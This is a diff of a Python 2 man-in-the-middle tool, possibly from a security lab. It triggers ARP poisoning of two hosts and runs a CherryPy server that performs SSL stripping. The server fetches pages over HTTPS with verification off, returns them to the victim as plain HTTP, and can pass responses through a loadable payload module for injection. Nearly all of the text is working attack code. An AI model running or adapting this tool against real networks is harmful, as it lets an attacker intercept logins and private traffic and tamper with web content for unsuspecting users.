@@ -44,10 +44,6 @@ arp.arpPoisonA()
 if (args.spoof_bob):
     arp.arpPoisonB()
 
-# Logging function
-def log(msg):
-    print msg
-
 # Strips all https content out of a https request, creating a beleivable http response
 def fromHTTPStoHTTP(r, url):
     # Create a new response
@@ -73,9 +69,7 @@ def fromHTTPStoHTTP(r, url):
     response.elapsed = r.elapsed
     response.request = r.request
 
-
-
-    log("HTTPS was stripped")
+    print "HTTPS was stripped"
 
     return response
 
@@ -83,26 +77,25 @@ class SSLStrip(object):
     # actual method that does the ssl stripping
     @cherrypy.expose
     def default(self, *route):
-        # As true MitM we always request the content from server
-
         # Get the requested URL from cherrypy
         url = cherrypy.url()
         print "Request received for url: " + url
+
+        # Insert https connection because we are connecting to a https server
         url = str(url).replace("http", "https")
+
+        # Retrieve data from Bob
         r = requests.get(url, verify=False)
 
+        # Log status code and encoding
         print "Request made and returned status code: " +  str(r.status_code)
-
-        # always assume we are on https
-        print "HTTPS redirect, SSL stripping engaged"
-
         print "Response encoding: " + str(r.encoding)
 
+        # If this is not text, then just return the content
         if(str(r.encoding) == "None"):
             return r.content
 
-        # reset the request content to the actual content of the webpage and
-        # change headers in response, reset status codes,
+        # Otherwise, we have text and we need to filter https content
         response = fromHTTPStoHTTP(r, url)
 
         # Additional payloads can be loaded from an external script, runs the payload() function
@@ -111,27 +104,13 @@ class SSLStrip(object):
             import payload
             response = payload.payload(response)
 
-        # return the response
+        # Return the (now http) response
         return response.content
 
-    @cherrypy.expose
-    def hello(self):
-        log("Hello World request received")
-        return "Hello World"
-
-    @cherrypy.expose
-    def redirect(self):
-        log("Test request received")
-        ## start by requesting a simple http form from bob
-        r = requests.get(http(args.ipB))
-        print r.status_code
-        print r.headers
-
-        return r.text
-# starting the server
+# Starting the server
 if __name__ == '__main__':
-    # this command binds cherrypy to all interfaces of this machine, hence it is findable on the network
+    # This command binds cherrypy to all interfaces of this machine, hence it is findable on the network on port 8080
     cherrypy.config.update({'server.socket_host': '0.0.0.0'})
-    # this command actually starts the server
+    # This command actually starts the server
     cherrypy.quickstart(SSLStrip())
 
